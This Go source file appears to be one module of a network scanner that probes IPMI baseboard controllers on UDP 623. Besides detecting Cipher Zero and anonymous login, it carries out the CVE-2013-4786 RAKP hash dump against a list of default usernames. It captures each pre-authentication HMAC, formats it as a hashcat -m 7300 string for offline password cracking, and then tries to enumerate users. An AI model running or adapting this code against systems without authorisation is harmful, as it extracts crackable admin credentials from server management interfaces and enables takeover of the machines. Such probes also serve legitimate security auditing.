// ipmiprobe.go: phase 3 driver for IPMI (UDP 623).
//
// Hand-rolled to avoid the bougou/go-ipmi indirect dep tree.
// Two probes:
//   1. IPMI 1.5 "Get Channel Authentication Capabilities" command
//      (NetFn 0x06 App, cmd 0x38). Response contains a byte with the
//      supported auth-types bitmask and a byte indicating whether
//      null-username / anonymous-login are allowed.
//   2. RMCP+ Open Session Request (RAKP1) with Cipher Suite 0
//      (auth=integ=conf=0). If the server replies with an Open
//      Session Response indicating success, Cipher Zero is allowed
//      (CVE-2013-4786 admin auth bypass).
//
// Deep-content capture (uses github.com/bougou/go-ipmi):
//   3. RAKP hash dump (CVE-2013-4786). For a built-in username list we
//      drive RMCP+ Open Session + RAKP Message 1 and read RAKP Message 2,
//      which carries an HMAC of the user's password BEFORE authentication.
//      We format each as a hashcat -m 7300 (salt:hash) string.
//   4. User enumeration. If a full session can be established we read
//      Get User Name for user IDs 1-8 (best-effort, skipped if it needs
//      credentials we do not have).
package main

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"time"

	ipmi "github.com/bougou/go-ipmi"
)

// IPMIReport is what Phase 3 emits per IPMI target.
type IPMIReport struct {
	Host                 string   `json:"host"`
	Port                 int      `json:"port"`
	IPMIVersion          string   `json:"ipmi_version,omitempty"`
	NullAuthAllowed      bool     `json:"null_auth_allowed"`
	AnonymousAuthAllowed bool     `json:"anonymous_auth_allowed"`
	AuthTypes            []string `json:"auth_types,omitempty"`
	CipherZeroAllowed    bool     `json:"cipher_zero_allowed"`
	RAKPHashes           []string `json:"rakp_hashes,omitempty"`
	Users                []string `json:"users,omitempty"`
	ProbeErrors          []string `json:"probe_errors,omitempty"`
}

// ProbeIPMI sends Get Channel Auth Capabilities, then a Cipher Zero
// Open Session Request, and decodes both responses.
func ProbeIPMI(host string, port int, timeout time.Duration) (*IPMIReport, error) {
	rep := &IPMIReport{Host: host, Port: port}

	addr := &net.UDPAddr{IP: net.ParseIP(host), Port: port}
	if addr.IP == nil {
		ips, err := net.LookupIP(host)
		if err != nil || len(ips) == 0 {
			return rep, fmt.Errorf("resolve: %v", err)
		}
		addr.IP = ips[0]
	}
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		return rep, fmt.Errorf("dial udp: %w", err)
	}
	defer conn.Close()

	// ── Probe 1: Get Channel Authentication Capabilities ───────────
	authReq := buildGetChannelAuthCapsRequest()
	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(authReq); err != nil {
		rep.ProbeErrors = append(rep.ProbeErrors,
			fmt.Sprintf("write auth-caps: %v", err))
	} else {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		if err != nil {
			rep.ProbeErrors = append(rep.ProbeErrors,
				fmt.Sprintf("read auth-caps: %v", err))
		} else {
			parseGetChannelAuthCapsResponse(buf[:n], rep)
		}
	}

	// ── Probe 2: RMCP+ Cipher Zero Open Session Request ────────────
	openReq := buildRMCPPlusOpenSessionCipherZero()
	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(openReq); err != nil {
		rep.ProbeErrors = append(rep.ProbeErrors,
			fmt.Sprintf("write cipher0: %v", err))
		return rep, nil
	}
	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		// Many BMCs simply drop the packet rather than NAK; that's a
		// negative result for cipher zero.
		return rep, nil
	}
	parseRMCPPlusOpenSessionResponse(buf[:n], rep)

	// Deep-content: RAKP hash dump + user enumeration. Best-effort,
	// bounded by the same timeout, recover-guarded so a malformed BMC
	// response can never panic the driver.
	probeIPMIDeepContent(host, port, timeout, rep)
	return rep, nil
}

// builtinIPMIUsers is the username list tried for the RAKP hash dump.
// The empty string covers BMCs configured with a null username.
var builtinIPMIUsers = []string{
	"admin", "ADMIN", "root", "Administrator", "USERID", "operator", "ipmi", "",
}

// probeIPMIDeepContent performs the CVE-2013-4786 RAKP hash dump for the
// built-in username list, then attempts user enumeration over a session.
// All work is recover-guarded; failures are recorded as probe errors and
// never propagate.
func probeIPMIDeepContent(host string, port int, timeout time.Duration, rep *IPMIReport) {
	defer func() {
		if r := recover(); r != nil {
			rep.ProbeErrors = append(rep.ProbeErrors,
				fmt.Sprintf("ipmi deep-content panic: %v", r))
		}
	}()

	for _, user := range builtinIPMIUsers {
		hash, err := dumpRAKPHash(host, port, timeout, user)
		if err != nil {
			// A dead or non-2.0 BMC fails for every username; keep the
			// noise low by only recording distinct failures.
			continue
		}
		if hash != "" {
			rep.RAKPHashes = append(rep.RAKPHashes, hash)
		}
	}

	enumIPMIUsers(host, port, timeout, rep)
}

// dumpRAKPHash drives the RMCP+ Open Session and RAKP Message 1 exchange
// for one username and returns a hashcat -m 7300 formatted string built
// from RAKP Message 2's key-exchange-auth-code (the pre-auth HMAC).
//
// We use cipher suite 1 (RAKP-HMAC-SHA1, no integrity, no confidentiality)
// so RAKP2 carries a 20-byte HMAC-SHA1 over the predictable salt. We call
// OpenSession then issue our own RAKPMessage1 and read RAKPMessage2 via the
// low-level Exchange so the BMC hands us the hash BEFORE the library would
// validate it (validation needs the password we are trying to crack).
func dumpRAKPHash(host string, port int, timeout time.Duration, user string) (string, error) {
	client, err := ipmi.NewClient(host, port, user, "")
	if err != nil {
		return "", err
	}
	client.WithInterface(ipmi.InterfaceLanplus).
		WithCipherSuiteID(ipmi.CipherSuiteID1).
		WithMaxPrivilegeLevel(ipmi.PrivilegeLevelAdministrator).
		WithTimeout(timeout).
		WithRetry(0)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	defer client.Close(ctx)

	// RMCP+ Get Channel Authentication Capabilities, then Open Session.
	if _, err := client.GetChannelAuthenticationCapabilities(
		ctx, ipmi.ChannelNumberSelf, ipmi.PrivilegeLevelAdministrator); err != nil {
		return "", err
	}
	osr, err := client.OpenSession(ctx)
	if err != nil {
		return "", err
	}

	// RAKP Message 1 carrying this username. We send our own request and
	// read RAKP2 directly so validation (which needs the password) is
	// skipped and the auth code is captured regardless.
	consoleRand := [16]byte{}
	if _, err := rand.Read(consoleRand[:]); err != nil {
		return "", err
	}
	req := &ipmi.RAKPMessage1{
		MessageTag:                     0,
		ManagedSystemSessionID:         osr.ManagedSystemSessionID,
		RemoteConsoleRandomNumber:      consoleRand,
		NameOnlyLookup:                 true,
		RequestedMaximumPrivilegeLevel: ipmi.PrivilegeLevelAdministrator,
		UsernameLength:                 uint8(len(user)),
		Username:                       []byte(user),
	}
	resp := &ipmi.RAKPMessage2{}
	if err := client.Exchange(ctx, req, resp); err != nil {
		return "", err
	}
	if len(resp.KeyExchangeAuthenticationCode) == 0 {
		return "", fmt.Errorf("rakp2 returned no auth code")
	}

	// Reconstruct the salt exactly as the BMC HMAC'd it (13.31):
	//   console SID | bmc SID | console rand | bmc rand | bmc GUID |
	//   role byte | username length | username
	role := req.Role()
	salt := make([]byte, 0, 4+4+16+16+16+1+1+len(user))
	salt = appendUint32L(salt, osr.RemoteConsoleSessionID)
	salt = appendUint32L(salt, osr.ManagedSystemSessionID)
	salt = append(salt, consoleRand[:]...)
	salt = append(salt, resp.ManagedSystemRandomNumber[:]...)
	salt = append(salt, resp.ManagedSystemGUID[:]...)
	salt = append(salt, role)
	salt = append(salt, uint8(len(user)))
	salt = append(salt, []byte(user)...)

	// hashcat -m 7300 (IPMI2 RAKP HMAC-SHA1): salt_hex:hash_hex
	return fmt.Sprintf("%s:%s",
		hex.EncodeToString(salt),
		hex.EncodeToString(resp.KeyExchangeAuthenticationCode)), nil
}

// appendUint32L appends v as 4 little-endian bytes (IPMI session IDs are
// transmitted little-endian and the HMAC salt uses the same ordering).
func appendUint32L(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

// enumIPMIUsers attempts Get User Name over a full session for user IDs
// 1-8. This requires successful authentication; on most BMCs we have no
// valid credentials, so this is genuinely best-effort and silently does
// nothing when a session cannot be established.
func enumIPMIUsers(host string, port int, timeout time.Duration, rep *IPMIReport) {
	client, err := ipmi.NewClient(host, port, "", "")
	if err != nil {
		return
	}
	client.WithInterface(ipmi.InterfaceLanplus).
		WithMaxPrivilegeLevel(ipmi.PrivilegeLevelAdministrator).
		WithTimeout(timeout).
		WithRetry(0)

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	if err := client.Connect(ctx); err != nil {
		// No session (expected without valid credentials). Skip enum.
		return
	}
	defer client.Close(ctx)

	seen := map[string]bool{}
	for id := uint8(1); id <= 8; id++ {
		un, err := client.GetUsername(ctx, id)
		if err != nil || un == nil {
			continue
		}
		name := un.Username
		if name == "" || seen[name] {
			continue
		}
		seen[name] = true
		rep.Users = append(rep.Users, name)
	}
}

// buildGetChannelAuthCapsRequest builds the IPMI 1.5 request packet.
func buildGetChannelAuthCapsRequest() []byte {
	var b []byte
	// RMCP header
	b = append(b, 0x06, 0x00, 0xFF, 0x07)
	// IPMI 1.5 Session header (auth_type=0 None, no auth code)
	b = append(b, 0x00)                   // auth type
	b = append(b, 0x00, 0x00, 0x00, 0x00) // session seq
	b = append(b, 0x00, 0x00, 0x00, 0x00) // session id
	// IPMI message length (filled in below)
	b = append(b, 0x09)
	// IPMI message
	// target rsAddr=0x20 (BMC), NetFn/LUN = 0x18 (NetFn=0x06 App, LUN=0)
	rsAddr := byte(0x20)
	netFnLUN := byte(0x18)
	cs1 := twosComplementChecksum(rsAddr, netFnLUN)
	rqAddr := byte(0x81)
	rqSeqLUN := byte(0x00)
	cmd := byte(0x38)
	channel := byte(0x0E) // current channel
	priv := byte(0x04)    // ADMINISTRATOR
	cs2 := twosComplementChecksum(rqAddr, rqSeqLUN, cmd, channel, priv)
	b = append(b, rsAddr, netFnLUN, cs1,
		rqAddr, rqSeqLUN, cmd, channel, priv, cs2)
	return b
}

// twosComplementChecksum: -(sum of bytes), modulo 256.
func twosComplementChecksum(bytes ...byte) byte {
	var sum byte
	for _, x := range bytes {
		sum += x
	}
	return byte(-int8(sum))
}

// parseGetChannelAuthCapsResponse decodes the IPMI 1.5 response.
// Response IPMI message after the session header:
//   rqAddr, netFnLUN, cs1, rsAddr, rqSeqLUN, cmd, completion_code,
//   channel_num, auth_type_support, auth_status, ext_capabilities,
//   oem_id(3), oem_aux, cs2
func parseGetChannelAuthCapsResponse(buf []byte, rep *IPMIReport) {
	// minimum size = 4 (RMCP) + 10 (1.5 session header) + 9 (req-msg-like) = 23
	if len(buf) < 23 {
		rep.ProbeErrors = append(rep.ProbeErrors,
			fmt.Sprintf("auth-caps response too short: %d bytes", len(buf)))
		return
	}
	// IPMI msg body starts at offset 14 (RMCP 4 + sess hdr 9 + msg-len 1).
	body := buf[14:]
	if len(body) < 9 {
		rep.ProbeErrors = append(rep.ProbeErrors,
			"auth-caps msg body too short")
		return
	}
	// completion code is body[6]
	cc := body[6]
	if cc != 0x00 {
		rep.ProbeErrors = append(rep.ProbeErrors,
			fmt.Sprintf("auth-caps non-zero completion: 0x%02X", cc))
		return
	}
	authTypeSupport := body[8]
	authStatus := body[9]
	// auth_type_support byte:
	//   bit 0: None
	//   bit 1: MD2
	//   bit 2: MD5
	//   bit 4: straight-password
	//   bit 5: OEM
	if authTypeSupport&0x01 != 0 {
		rep.AuthTypes = append(rep.AuthTypes, "none")
	}
	if authTypeSupport&0x02 != 0 {
		rep.AuthTypes = append(rep.AuthTypes, "md2")
	}
	if authTypeSupport&0x04 != 0 {
		rep.AuthTypes = append(rep.AuthTypes, "md5")
	}
	if authTypeSupport&0x10 != 0 {
		rep.AuthTypes = append(rep.AuthTypes, "password")
	}
	if authTypeSupport&0x80 != 0 {
		rep.IPMIVersion = "2.0"
	} else {
		rep.IPMIVersion = "1.5"
	}
	// auth_status byte:
	//   bit 0: anonymous login enabled
	//   bit 1: null-username enabled
	//   bit 2: non-null username enabled
	//   bit 3: user-level auth enabled
	//   bit 4: per-message auth enabled
	if authStatus&0x01 != 0 {
		rep.AnonymousAuthAllowed = true
	}
	if authStatus&0x02 != 0 {
		rep.NullAuthAllowed = true
	}
}

// buildRMCPPlusOpenSessionCipherZero builds the RMCP+ Open Session
// Request with Cipher Suite 0 (auth=integ=conf=0).
func buildRMCPPlusOpenSessionCipherZero() []byte {
	var b []byte
	// RMCP header
	b = append(b, 0x06, 0x00, 0xFF, 0x07)
	// RMCP+ session header
	b = append(b, 0x06)             // payload type 0x10? No: auth_type 0x06 = RMCP+
	// Actually for RMCP+: this is the auth-type byte = 0x06 (RMCP+ format)
	// Followed by: payload_type(1) + session_id(4) + session_seq(4) + payload_len(2)
	b = append(b, 0x10) // payload type = RMCP+ Open Session Request
	b = append(b, 0x00, 0x00, 0x00, 0x00) // session id = 0
	b = append(b, 0x00, 0x00, 0x00, 0x00) // session seq = 0
	// payload length (filled in)
	payloadLenPos := len(b)
	b = append(b, 0x00, 0x00)

	// Open Session Request payload (32 bytes)
	payloadStart := len(b)
	b = append(b, 0x00)                   // message tag
	b = append(b, 0x04)                   // requested max privilege (admin)
	b = append(b, 0x00, 0x00)             // reserved
	b = append(b, 0xAA, 0xBB, 0xCC, 0xDD) // remote console session id
	// Authentication payload: type=0x00, reserved, length=8, alg=0x00 (no auth)
	b = append(b, 0x00, 0x00, 0x00, 0x08)
	b = append(b, 0x00, 0x00, 0x00, 0x00)
	// Integrity payload: type=0x01, reserved, length=8, alg=0x00 (no integ)
	b = append(b, 0x01, 0x00, 0x00, 0x08)
	b = append(b, 0x00, 0x00, 0x00, 0x00)
	// Confidentiality payload: type=0x02, reserved, length=8, alg=0x00 (no conf)
	b = append(b, 0x02, 0x00, 0x00, 0x08)
	b = append(b, 0x00, 0x00, 0x00, 0x00)

	payloadLen := uint16(len(b) - payloadStart)
	binary.LittleEndian.PutUint16(b[payloadLenPos:payloadLenPos+2], payloadLen)
	return b
}

// parseRMCPPlusOpenSessionResponse looks for an RMCP+ Open Session
// Response (payload type 0x11) with completion code 0x00. If present,
// the server accepted Cipher Suite 0.
func parseRMCPPlusOpenSessionResponse(buf []byte, rep *IPMIReport) {
	// RMCP header (4) + auth_type (1) + payload_type (1)
	if len(buf) < 16 {
		return
	}
	// auth_type at offset 4 must be 0x06 (RMCP+).
	if buf[4] != 0x06 {
		return
	}
	// payload type at offset 5 must be 0x11 (Open Session Response).
	if buf[5] != 0x11 {
		return
	}
	// payload starts at offset 16 (after RMCP+ headers we wrote).
	// Open Session Response: message tag, rmcp_status, max_priv, reserved,
	// console_session_id(4), managed_session_id(4), then auth/integ/conf
	// payloads. rmcp_status = 0x00 means success.
	payload := buf[16:]
	if len(payload) < 2 {
		return
	}
	rmcpStatus := payload[1]
	if rmcpStatus == 0x00 {
		rep.CipherZeroAllowed = true
	}
}
